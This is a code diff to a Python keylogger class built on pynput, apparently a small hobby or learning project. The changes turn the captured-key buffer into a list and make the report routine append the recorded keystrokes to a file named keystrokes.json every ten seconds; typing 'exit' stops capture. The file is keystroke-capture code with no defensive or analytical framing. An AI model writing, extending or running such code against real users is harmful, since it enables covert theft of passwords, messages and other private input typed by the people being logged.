@@ -1,13 +1,14 @@
+import json
 import pynput.keyboard
 import threading
 
 class Keylogger:
     def __init__(self):
-        self.log = ''
+        self.log = []
         self.stop_keylogger = False
 
     def append_to_keylog(self, string):
-        self.log += str(string)
+        self.log.append(string)
 
     def on_press(self, key):
         current_key = ''
@@ -32,13 +33,15 @@ class Keylogger:
         self.append_to_keylog(current_key)
 
         # Check for "exit" keyword
-        if "exit" in self.log.lower():
+        if "exit" in ''.join(self.log).lower():
             self.stop_keylogger = True
             return False
 
     def report(self):
-        print(self.log)
-        self.log = ''
+        words = ''.join(self.log).split()
+        with open('keystrokes.json', 'a') as file:
+            json.dump(words, file)
+        self.log = []
         if not self.stop_keylogger:
             timer = threading.Timer(10, self.report)
             timer.start()
